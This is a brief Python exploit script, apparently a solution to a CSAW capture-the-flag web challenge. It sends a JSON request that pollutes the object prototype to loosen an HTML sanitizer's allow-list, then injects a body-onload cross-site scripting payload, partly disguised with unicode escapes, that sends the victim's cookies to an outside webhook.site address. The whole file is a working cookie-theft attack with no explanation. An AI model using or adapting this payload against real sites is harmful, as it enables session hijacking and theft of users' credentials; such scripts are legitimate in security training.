#!/usr/bin/env python3

import requests
import json

url = "http://web.chal.csaw.io:5007"

data = {
    "name": "l3o",
    "emergency": True,
    "__proto__": {"whiteList": {
            "body": [
                "onload"
            ]
        }
    },
    "message": "<body onload=\"window.lo\\u0063ation.href = 'https://webhook.site/05f62db\\u0063-8f0f-4209-b081-4e441f395db2/?flag=' + window.do\\u0063ument.\\u0063ookie\"></body>"
}


header = {
    "Content-Type": "application/json"
}

requests.post(url+"/contact", data=json.dumps(data), headers=header)




